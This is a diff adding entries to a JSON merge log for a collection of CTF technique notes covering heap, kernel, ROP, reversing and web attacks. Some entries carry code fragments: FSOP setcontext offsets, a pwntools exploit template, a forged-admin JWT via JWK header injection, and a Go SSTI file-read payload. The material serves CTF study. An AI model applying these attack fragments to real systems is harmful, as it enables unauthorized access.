+    "delta": "--- \n\n+++ \n\n@@ -15,4 +15,7 @@\n\n - [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)\n - [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)\n+- [Largebin Attack \u2014 Dedicated Technique (TravelGraph / Setjmp 2024)](#largebin-attack--dedicated-technique-travelgraph--setjmp-2024)\n+- [tcache 2.39 Changes \u2014 Key, Count, and calloc](#tcache-239-changes--key-count-and-calloc)\n+- [House of Tangerine \u2014 tcache Count + Unsorted Bin Variant](#house-of-tangerine--tcache-count--unsorted-bin-variant)\n \n For CTF-specific UAF, tcache, and custom-allocator writeup variants \u2014 UAF vtable pointer encoding, uninitialized chunk residue leak, tcache strcpy null-byte overflow, adjacent-struct fn-pointer overflow, hidden menu tcache poisoning, tcache double-free stdout hijack, tcache-to-fastbin promotion, 6-bit OOB accumulator, IS_MMAPED bit-flip, filename-regex LSB fastbin, and custom-allocator unsafe unlink \u2014 see [heap-techniques-2.md](heap-techniques-2.md)."
+  },
+  {
+    "source": "ctf-pwn/heap-techniques.md",
+    "heading": "## House of Apple 2 \u2014 FSOP for glibc 2.34+ (0xFun 2026)",
+    "destination": "ctf-pwn/heap-techniques.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -45,6 +45,10 @@\n\n })\n \n-# setcontext loads registers from offsets relative to RDX (which points to fp->_wide_data):\n-#   RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]\n+# setcontext loads registers from the ucontext struct it is called with:\n+#   glibc >= 2.29: ucontext pointer in RDI (fp->_wide_data when reached via\n+#     _IO_wdoallocbuf) \u2014 RSP from [rdi+0xa0], RIP from [rdi+0xa8],\n+#     RDI (first argument) from [rdi+0x68].\n+#   glibc <= 2.28: registers were loaded relative to RDX instead\n+#     (RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]).\n # Place ROP chain at _wide_data structure:\n fake_wide_data = flat({"
+  },
+  {
+    "source": "ctf-pwn/heap-techniques.md",
+    "heading": "## Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)",
+    "destination": "ctf-pwn/heap-techniques.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -21,3 +21,2 @@\n\n **Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.\n \n-For CTF-specific UAF, tcache, and custom-allocator writeup variants, continue in [heap-techniques-2.md](heap-techniques-2.md)."
+  },
+  {
+    "source": "ctf-pwn/heap-techniques.md",
+    "heading": "## Largebin Attack \u2014 Dedicated Technique (TravelGraph / Setjmp 2024)",
+    "destination": "ctf-pwn/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-pwn/heap-techniques.md",
+    "heading": "## tcache 2.39 Changes \u2014 Key, Count, and calloc",
+    "destination": "ctf-pwn/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-pwn/heap-techniques.md",
+    "heading": "## House of Tangerine \u2014 tcache Count + Unsorted Bin Variant",
+    "destination": "ctf-pwn/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-pwn/kernel-bypass.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-pwn/kernel-bypass.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -8,4 +8,5 @@\n\n   - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)\n   - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)\n+- [CET Shadow Stack (SHSTK) and IBT \u2014 Signal-Frame Bypass (Wolv / IERAE 2024)](#cet-shadow-stack-shstk-and-ibt--signal-frame-bypass-wolv--ierae-2024)\n - [SMEP / SMAP Bypass](#smep--smap-bypass)\n - [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)"
+  },
+  {
+    "source": "ctf-pwn/kernel-bypass.md",
+    "heading": "## CET Shadow Stack (SHSTK) and IBT \u2014 Signal-Frame Bypass (Wolv / IERAE 2024)",
+    "destination": "ctf-pwn/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-pwn/kernel.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-pwn/kernel.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -28,4 +28,5 @@\n\n - [ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)](#acpi-dsdt-shellcode-injection-for-privilege-escalation-hxp-2018)\n - [ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)](#arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil-insomnihack-2019)\n+- [io_uring PBUF_RING Use-After-Free \u2014 CVE-2024-0582 (KernelCTF 2024)](#io_uring-pbuf_ring-use-after-free--cve-2024-0582-kernelctf-2024)\n For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).\n "
+  },
+  {
+    "source": "ctf-pwn/kernel.md",
+    "heading": "## ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)",
+    "destination": "ctf-pwn/kernel.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -17,2 +17,5 @@\n\n \n **References:** Insomnihack teaser 2019 \u2014 1118daysober, writeup 12903\n+\n+---\n+"
+  },
+  {
+    "source": "ctf-pwn/kernel.md",
+    "heading": "## io_uring PBUF_RING Use-After-Free \u2014 CVE-2024-0582 (KernelCTF 2024)",
+    "destination": "ctf-pwn/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-pwn/rop-advanced.md",
+    "heading": "## pwntools Template",
+    "destination": "ctf-pwn/rop-advanced.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,13 +4,17 @@\n\n from pwn import *\n \n-context.binary = elf = ELF('./binary')\n+elf = ELF('./binary', checksec=False)\n+context.binary = elf\n context.log_level = 'debug'\n+\n+HOST = args.HOST or 'host'\n+PORT = args.PORT or 1337\n \n def conn():\n     if args.GDB:\n-        return gdb.debug([exe], gdbscript='init-pwndbg\\ncontinue')\n+        return gdb.debug(elf.path, gdbscript='init-pwndbg\\ncontinue')\n     elif args.REMOTE:\n-        return remote('host', port)\n-    return process('./binary')\n+        return remote(HOST, PORT)\n+    return process(elf.path)\n \n io = conn()\n@@ -28,5 +32,5 @@\n\n     p.wait()\n     # x64: read saved RIP from stack pointer\n-    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))\n+    offset = cyclic_find(p.corefile.read(p.corefile.sp, 8))\n     # x86: use pc directly\n     # offset = cyclic_find(p.corefile.pc)"
+  },
+  {
+    "source": "ctf-reverse/languages-compiled.md",
+    "heading": "## Rust Binary Reversing",
+    "destination": "ctf-reverse/languages-compiled.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -51,12 +51,17 @@\n\n struct RustVec {\n     void *ptr;      // heap pointer\n+    uint64 len;     // length\n     uint64 cap;     // capacity\n-    uint64 len;     // length\n };\n+// NOTE: field order (ptr, len, cap) vs (ptr, cap, len) is NOT\n+// guaranteed by the Rust ABI and varies by compiler version \u2014\n+// confirm against the Vec constructor and its callers in\n+// disassembly before trusting offsets.\n ```\n \n **String / &str:**\n ```text\n-# String (owned): {ptr, capacity, length} \u2014 24 bytes, heap-allocated\n+# String (owned): {ptr, length, capacity} \u2014 24 bytes, heap-allocated\n+# (same caveat as Vec: field order is compiler-dependent, verify in disassembly)\n # &str (borrowed): {ptr, length} \u2014 16 bytes, can point anywhere\n "
+  },
+  {
+    "source": "ctf-reverse/languages-compiled.md",
+    "heading": "## C++ Binary Reversing (Quick Reference)",
+    "destination": "ctf-reverse/languages-compiled.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -62,5 +62,7 @@\n\n fn main() {\n     let aliased: &'static Vec<u8> = bad(vec![1u8, 2, 3]);\n-    // Reinterpret the Vec as its raw header: (ptr, len, cap)\n+    // Reinterpret the Vec as its raw header (field order is\n+    // compiler-dependent \u2014 NOT guaranteed by the Rust ABI;\n+    // confirm against the constructor/callers for this toolchain)\n     let header: &(usize, usize, usize) =\n         unsafe { std::mem::transmute(aliased) };"
+  },
+  {
+    "source": "ctf-reverse/patterns-ctf-3.md",
+    "heading": "## Morse Code from Keyboard LEDs via ioctl (PlaidCTF 2013)",
+    "destination": "ctf-reverse/patterns-ctf-3.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -8,5 +8,5 @@\n\n python3 -c \"\n data = open('binary','rb').read()\n-data = data[:0x72b] + b'\\x90'*5 + data[:0x730]  # NOP the ptrace call\n+data = data[:0x72b] + b'\\x90'*5 + data[0x730:]  # NOP the ptrace call\n open('patched','wb').write(data)\n \""
+  },
+  {
+    "source": "ctf-reverse/tools-emulation.md",
+    "heading": "## Intel Pin Instruction-Counting Side Channel (Hackover CTF 2015)",
+    "destination": "ctf-reverse/tools-emulation.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -8,5 +8,5 @@\n\n \n pin = './pin'\n-tool = './source/tools/ManualExamples/obj-ia32/inscount0.so'\n+tool = './source/tools/ManualExamples/obj-intel64/inscount0.so'\n binary = './target'\n "
+  },
+  {
+    "source": "ctf-reverse/unicorn-emulation.md",
+    "destination": "ctf-reverse/unicorn-emulation.md",
+    "decision": "imported",
+    "reason": "New upstream reference; reviewed and boundary-gated"
+  },
+  {
+    "source": "ctf-web/auth-jwt.md",
+    "heading": "## JWK Header Injection (Crypto-Cat)",
+    "destination": "ctf-web/auth-jwt.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -12,6 +12,6 @@\n\n     \"kty\": \"RSA\",\n     \"kid\": original_header['kid'],\n-    \"e\": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode(),\n-    \"n\": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()\n+    \"e\": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode(),\n+    \"n\": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()\n }\n forged = jwt.encode({\"sub\": \"administrator\"}, private_key, algorithm='RS256', headers={'jwk': jwk})"
+  },
+  {
+    "source": "ctf-web/field-notes.md",
+    "heading": "## Common Flag Locations",
+    "destination": "ctf-web/field-notes.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,2 +2,3 @@\n\n \n Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`. Env: `/proc/self/environ`. DB: `flag`, `flags`, `secret` tables. Headers: `x-flag`, `x-archive-tag`, `x-proof`. DOM: `display:none` elements, `data-*` attributes.\n+See pat-reference.md for bulk payload wordlists per category."
+  },
+  {
+    "source": "ctf-web/pat-reference.md",
+    "destination": "ctf-web/pat-reference.md",
+    "decision": "imported",
+    "reason": "New upstream reference; reviewed and boundary-gated"
+  },
+  {
+    "source": "ctf-web/python-requests.md",
+    "destination": "ctf-web/python-requests.md",
+    "decision": "imported",
+    "reason": "New upstream reference; reviewed and boundary-gated"
+  },
+  {
+    "source": "ctf-web/server-side.md",
+    "heading": "## SSTI (Server-Side Template Injection)",
+    "destination": "ctf-web/server-side.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -19,4 +19,5 @@\n\n {{.ReadFile \"/flag.txt\"}}\n ```\n+**Note:** `{{.ReadFile ...}}` only works if the application exposes a `ReadFile` function in its `template.FuncMap` (e.g. `template.New(\"x\").Funcs(template.FuncMap{\"ReadFile\": os.ReadFile})`) \u2014 Go's `text/template` has no file-read builtin, so this payload confirms a custom `FuncMap` entry, not default template behavior.\n \n ### EJS Server-Side Template Injection"
+  }
+]
